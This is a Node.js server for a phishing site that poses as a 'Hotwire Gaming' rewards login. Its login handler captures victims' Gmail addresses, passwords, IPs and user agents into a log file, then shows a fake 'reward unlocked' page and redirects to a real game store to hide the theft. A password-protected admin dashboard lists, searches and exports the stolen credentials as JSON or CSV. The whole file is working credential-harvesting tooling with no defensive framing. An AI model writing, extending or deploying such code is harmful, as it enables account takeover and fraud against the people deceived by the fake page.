const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = process.env.PORT || 8000;

// Admin authentication credentials
const ADMIN_USERNAME = 'hotwire_admin';
const ADMIN_PASSWORD = 'gaming2025';

// Helper: Basic auth verification
function verifyAuth(req) {
    const authHeader = req.headers.authorization || '';
    const encoded = authHeader.split(' ')[1] || '';
    const decoded = Buffer.from(encoded, 'base64').toString();
    const [username, password] = decoded.split(':');
    return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
}

// Helper: detect browser from user agent
function detectBrowser(userAgent) {
    if (!userAgent) return 'Unknown';
    const ua = userAgent.toLowerCase();
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('edge')) return 'Edge';
    if (ua.includes('opera')) return 'Opera';
    return 'Other';
}

// Helper: generate browser icon SVG
function getBrowserIcon(userAgent) {
    const browser = detectBrowser(userAgent);
    switch(browser) {
        case 'Chrome': return '<svg width="16" height="16" viewBox="0 0 24 24" fill="#4285F4"><path d="M12 12h8.5A8.5 8.5 0 0112 20.5v-8.5z"></path><path d="M12 12V3.5A8.5 8.5 0 003.5 12H12z"></path><path d="M12 12H3.5A8.5 8.5 0 0012 20.5V12z"></path><circle cx="12" cy="12" r="2.5" fill="white"></circle></svg>';
        case 'Firefox': return '<svg width="16" height="16" viewBox="0 0 24 24" fill="#FF7139"><path d="M12 12h8.5A8.5 8.5 0 0112 20.5v-8.5z"></path><path d="M12 12V3.5A8.5 8.5 0 003.5 12H12z"></path><path d="M12 12H3.5A8.5 8.5 0 0012 20.5V12z"></path></svg>';
        case 'Safari': return '<svg width="16" height="16" viewBox="0 0 24 24" fill="#000000"><circle cx="12" cy="12" r="10"></circle><path d="M12 8l-4 4 4 4 4-4-4-4z" fill="white"></path></svg>';
        case 'Edge': return '<svg width="16" height="16" viewBox="0 0 24 24" fill="#0078D7"><path d="M12 12h8.5A8.5 8.5 0 0112 20.5v-8.5z"></path><path d="M12 12V3.5A8.5 8.5 0 003.5 12H12z"></path><path d="M12 12H3.5A8.5 8.5 0 0012 20.5V12z"></path></svg>';
        default: return '<svg width="16" height="16" viewBox="0 0 24 24" fill="#666"><circle cx="12" cy="12" r="10"></circle></svg>';
    }
}

// Create HTTP server
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    // Serve static files (if needed)
    if (req.method === 'GET' && pathname.startsWith('/static/')) {
        const filePath = path.join(__dirname, pathname);
        const extname = path.extname(filePath).toLowerCase();
        const mimeTypes = {
            '.html': 'text/html',
            '.js': 'text/javascript',
            '.css': 'text/css',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.ico': 'image/x-icon',
            '.svg': 'image/svg+xml'
        };
        const contentType = mimeTypes[extname] || 'application/octet-stream';
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('File not found');
                return;
            }
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(data);
        });
        return;
    }

    // Serve verification file for domain authorization
    if (req.method === 'GET' && pathname === '/.well-known/geniusguard-verification.txt') {
        const wellKnownPath = path.join(__dirname, '.well-known', 'geniusguard-verification.txt');
        fs.readFile(wellKnownPath, 'utf8', (err, data) => {
            if (err) {
                console.error('Verification file not found at:', wellKnownPath);
                res.writeHead(404, { 'Content-Type': 'text/plain' });
                res.end('Verification file not found');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(data);
        });
        return;
    }

    // Serve the main Hotwire Gaming HTML (index)
    if (req.method === 'GET' && pathname === '/') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Error loading index.html');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Handle login POST requests from Hotwire Gaming form
    if (req.method === 'POST' && pathname === '/auth/login') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            console.log('[CAPTURE] Raw POST data:', body);
            try {
                const data = new URLSearchParams(body);
                const gmail = data.get('gmail');
                const password = data.get('password');
                
                const credentials = {
                    gmail: gmail || '',
                    password: password || '',
                    timestamp: new Date().toISOString(),
                    userAgent: req.headers['user-agent'],
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
                    referer: req.headers['referer'] || ''
                };
                
                console.log('🔥 HOTWIRE GAMING CREDENTIAL CAPTURED:');
                console.log(`📧 Gmail: ${credentials.gmail}`);
                console.log(`🔑 Password: ${credentials.password}`);
                console.log(`🌐 IP: ${credentials.ip}`);
                console.log(`🖥️ User-Agent: ${credentials.userAgent}`);
                
                // Append to credentials.log in JSON lines format (pretty)
                const logEntry = JSON.stringify(credentials, null, 2) + ',\n';
                fs.appendFile('hotwire_credentials.log', logEntry, (err) => {
                    if (err) {
                        console.error('❌ Error writing to log file:', err);
                    } else {
                        console.log('✅ Credentials saved to hotwire_credentials.log');
                    }
                });
                
                // Send success page: redirect to official gaming rewards page (enticing)
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Reward Unlocked | Hotwire Gaming</title>
                        <style>
                            * {
                                margin: 0;
                                padding: 0;
                                box-sizing: border-box;
                            }
                            body {
                                background: radial-gradient(circle at 30% 10%, #0a0f1e, #010101);
                                font-family: 'Segoe UI', 'Poppins', system-ui;
                                display: flex;
                                justify-content: center;
                                align-items: center;
                                height: 100vh;
                                color: white;
                            }
                            .reward-container {
                                background: rgba(0, 10, 25, 0.85);
                                backdrop-filter: blur(16px);
                                border-radius: 48px;
                                padding: 50px 40px;
                                text-align: center;
                                max-width: 550px;
                                width: 90%;
                                border: 1px solid #0af;
                                box-shadow: 0 0 70px rgba(0, 170, 255, 0.4);
                            }
                            .check {
                                font-size: 80px;
                                background: #00ffaa20;
                                width: 120px;
                                height: 120px;
                                border-radius: 60px;
                                display: flex;
                                align-items: center;
                                justify-content: center;
                                margin: 0 auto 20px;
                                border: 2px solid #0f0;
                                box-shadow: 0 0 30px #0f0;
                            }
                            h1 {
                                font-size: 34px;
                                background: linear-gradient(135deg, #fff, #0af);
                                -webkit-background-clip: text;
                                background-clip: text;
                                color: transparent;
                            }
                            p {
                                margin: 20px 0;
                                color: #bbddff;
                            }
                            .loader {
                                width: 48px;
                                height: 48px;
                                border: 5px solid #2a3f5e;
                                border-top: 5px solid #0af;
                                border-radius: 50%;
                                animation: spin 0.9s linear infinite;
                                margin: 30px auto;
                            }
                            @keyframes spin {
                                0% { transform: rotate(0deg); }
                                100% { transform: rotate(360deg); }
                            }
                            .btn {
                                background: linear-gradient(95deg, #00c6ff, #0072ff);
                                padding: 12px 28px;
                                border-radius: 40px;
                                display: inline-block;
                                text-decoration: none;
                                color: white;
                                font-weight: bold;
                                margin-top: 10px;
                            }
                        </style>
                    </head>
                    <body>
                        <div class="reward-container">
                            <div class="check">🎮</div>
                            <h1>VAULT ACCESS GRANTED</h1>
                            <p>Your Hotwire Gaming rewards are being prepared.<br>You will receive legendary loot crate in your email within minutes.</p>
                            <div class="loader"></div>
                            <p style="font-size: 14px;">Redirecting to official game hub...</p>
                            <script>
                                setTimeout(() => {
                                    window.location.href = 'https://www.epicgames.com';
                                }, 3200);
                            </script>
                        </div>
                    </body>
                    </html>
                `);
            } catch (error) {
                console.error('Error processing Hotwire login:', error);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Server error');
            }
        });
        return;
    }

    // ADMIN DASHBOARD (professional)
    if (req.method === 'GET' && pathname === '/admin') {
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Hotwire Admin Panel"',
                'Content-Type': 'text/html'
            });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head><title>Admin Auth</title><style>body{font-family:sans-serif;background:#000;color:#0af;display:flex;justify-content:center;align-items:center;height:100vh;}</style></head>
                <body><div style="background:#111;padding:40px;border-radius:20px;"><h1>Authentication Required</h1><p>Access to Hotwire Gaming Intelligence</p></div></body>
                </html>
            `);
            return;
        }
        
        // Read captured credentials
        fs.readFile('hotwire_credentials.log', 'utf8', (err, data) => {
            let credentials = [];
            let stats = {
                total: 0,
                today: 0,
                uniqueIps: new Set(),
                browsers: { chrome: 0, firefox: 0, safari: 0, edge: 0, other: 0 }
            };
            const todayStr = new Date().toDateString();
            
            if (!err && data && data.trim()) {
                try {
                    let cleanData = data.trim().replace(/,\s*$/, '');
                    const jsonArray = '[' + cleanData + ']';
                    credentials = JSON.parse(jsonArray);
                    stats.total = credentials.length;
                    credentials.forEach(cred => {
                        const credDate = new Date(cred.timestamp).toDateString();
                        if (credDate === todayStr) stats.today++;
                        if (cred.ip) stats.uniqueIps.add(cred.ip);
                        const ua = cred.userAgent?.toLowerCase() || '';
                        if (ua.includes('chrome')) stats.browsers.chrome++;
                        else if (ua.includes('firefox')) stats.browsers.firefox++;
                        else if (ua.includes('safari') && !ua.includes('chrome')) stats.browsers.safari++;
                        else if (ua.includes('edge')) stats.browsers.edge++;
                        else stats.browsers.other++;
                    });
                } catch(e) { console.error('Parse error', e); }
            }
            stats.uniqueIpsCount = stats.uniqueIps.size;
            
            // Generate admin dashboard HTML
            const adminHTML = generateHotwireDashboard(credentials, stats);
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(adminHTML);
        });
        return;
    }
    
    // Download JSON log
    if (req.method === 'GET' && pathname === '/admin/download') {
        if (!verifyAuth(req)) {
            res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
            res.end('Auth required');
            return;
        }
        const filename = `hotwire_creds_${new Date().toISOString().split('T')[0]}.json`;
        res.writeHead(200, {
            'Content-Type': 'application/json',
            'Content-Disposition': `attachment; filename="${filename}"`
        });
        fs.exists('hotwire_credentials.log', (exists) => {
            if (exists) {
                fs.createReadStream('hotwire_credentials.log').pipe(res);
            } else {
                res.end('[]');
            }
        });
        return;
    }
    
    // Export as CSV
    if (req.method === 'GET' && pathname === '/admin/export-csv') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Auth required');
            return;
        }
        fs.readFile('hotwire_credentials.log', 'utf8', (err, data) => {
            let csv = "Timestamp,Gmail,Password,IP Address,Browser,User Agent\n";
            if (!err && data && data.trim()) {
                try {
                    let clean = data.trim().replace(/,\s*$/, '');
                    const arr = JSON.parse('[' + clean + ']');
                    arr.forEach(cred => {
                        const ts = new Date(cred.timestamp).toLocaleString();
                        const gmail = (cred.gmail || '').replace(/,/g, ';');
                        const pwd = (cred.password || '').replace(/,/g, ';');
                        const ip = cred.ip || '';
                        const browser = detectBrowser(cred.userAgent);
                        const ua = (cred.userAgent || '').replace(/,/g, ';');
                        csv += `"${ts}","${gmail}","${pwd}","${ip}","${browser}","${ua}"\n`;
                    });
                } catch(e) { console.error(e); }
            }
            const filename = `hotwire_export_${new Date().toISOString().split('T')[0]}.csv`;
            res.writeHead(200, { 'Content-Type': 'text/csv', 'Content-Disposition': `attachment; filename="${filename}"` });
            res.end(csv);
        });
        return;
    }
    
    // Delete all logs
    if (req.method === 'GET' && pathname === '/admin/delete-all') {
        if (!verifyAuth(req)) {
            res.writeHead(401);
            res.end('Unauthorized');
            return;
        }
        fs.writeFile('hotwire_credentials.log', '', (err) => {
            res.writeHead(302, { 'Location': '/admin' });
            res.end();
        });
        return;
    }
    
    // 404 fallback
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end(`
        <!DOCTYPE html>
        <html><head><title>404</title><style>body{background:#0a0f1e;color:cyan;display:flex;justify-content:center;align-items:center;height:100vh;}</style></head>
        <body><div><h1>Lost in the grid</h1><a href="/" style="color:#0af;">Return to Hotwire Gaming</a></div></body>
        </html>
    `);
});

// Dashboard generation function (similar to MTN but tuned for Hotwire)
function generateHotwireDashboard(credentials, stats) {
    return `<!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Hotwire Admin | Credentials</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{background:#0b0e17;font-family:'Inter',system-ui;color:#eef}
        .dashboard{max-width:1400px;margin:0 auto;padding:2rem}.header{background:#080c16;border-radius:24px;padding:1.5rem;margin-bottom:2rem;border-left:6px solid #0af}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.5rem;margin-bottom:2rem}
        .card{background:#11161f;border-radius:20px;padding:1.5rem;border:1px solid #2a3f5e}
        .value{font-size:2.5rem;font-weight:800;color:#0af}
        .label{color:#8aa9c9;margin-top:0.5rem}
        .actions{display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:2rem}
        .btn{background:#1e2a3a;border:none;padding:0.7rem 1.4rem;border-radius:40px;color:white;cursor:pointer;text-decoration:none;display:inline-flex;gap:8px;align-items:center}
        .btn-danger{background:#a02030}.btn-primary{background:#0a5f8a}
        .table-wrap{overflow-x:auto;background:#0f141f;border-radius:24px;padding:0}
        table{width:100%;border-collapse:collapse}th,td{padding:1rem;text-align:left;border-bottom:1px solid #1f2a3a}
        th{color:#0af}tr:hover{background:#1a2332}
        .search{background:#0c111c;border:1px solid #2c405c;padding:0.8rem;border-radius:60px;width:100%;max-width:300px;color:white}
        .empty-state{padding:4rem;text-align:center}
    </style></head>
    <body><div class="dashboard">
        <div class="header"><h1><i class="fas fa-dragon"></i> Hotwire Gaming Intel</h1><p>Captured account access logs</p></div>
        <div class="stats">
            <div class="card"><div class="value">${stats.total}</div><div class="label">Total Captures</div></div>
            <div class="card"><div class="value">${stats.today}</div><div class="label">Today</div></div>
            <div class="card"><div class="value">${stats.uniqueIpsCount || 0}</div><div class="label">Unique IPs</div></div>
            <div class="card"><div class="value">${Object.values(stats.browsers).reduce((a,b)=>a+b,0)}</div><div class="label">Devices</div></div>
        </div>
        <div class="actions">
            <a href="/admin/download" class="btn btn-primary">⬇️ Download JSON</a>
            <a href="/admin/export-csv" class="btn">📊 Export CSV</a>
            <a href="/admin/delete-all" class="btn btn-danger" onclick="return confirm('Delete all logs?')">🗑️ Clear Data</a>
            <button class="btn" onclick="location.reload()">🔄 Refresh</button>
        </div>
        <div class="table-wrap"><input type="text" class="search" placeholder="Search email/password..." id="searchInput" style="margin:1rem;width:auto;"><table id="credsTable"><thead><tr><th>#</th><th>Timestamp</th><th>Gmail</th><th>Password</th><th>IP</th><th>Browser</th></tr></thead><tbody>
        ${credentials.length ? credentials.map((c,i)=>`<tr><td>${credentials.length-i}</td><td>${new Date(c.timestamp).toLocaleString()}</td><td style="color:#0af">${c.gmail || ''}</td><td style="color:#ffaa66">${c.password || ''}</td><td>${c.ip || 'unknown'}</td><td>${detectBrowser(c.userAgent)}</td></tr>`).join('') : '<tr><td colspan="6" class="empty-state">🎮 No credentials captured yet. Waiting for hotwire logins.</td></tr>'}
        </tbody></table></div>
        <div style="margin-top:2rem;font-size:12px;color:#5a6e8a;">Hotwire Gaming Panel — secure environment</div>
    </div>
    <script>document.getElementById('searchInput')?.addEventListener('keyup',function(){let q=this.value.toLowerCase();document.querySelectorAll('#credsTable tbody tr').forEach(row=>{let text=row.innerText.toLowerCase();row.style.display=text.includes(q)?'':'none';})});</script>
    </body></html>`;
}

server.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════╗
    ║   🔥 HOTWIRE GAMING SERVER ACTIVE 🔥     ║
    ╠══════════════════════════════════════════╣
    ║  🎮 Login page: http://localhost:${PORT}    ║
    ║  🛡️ Admin panel: http://localhost:${PORT}/admin ║
    ║  📁 Log file: hotwire_credentials.log    ║
    ║  🔐 Admin login: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}  ║
    ╚══════════════════════════════════════════╝
    `);
});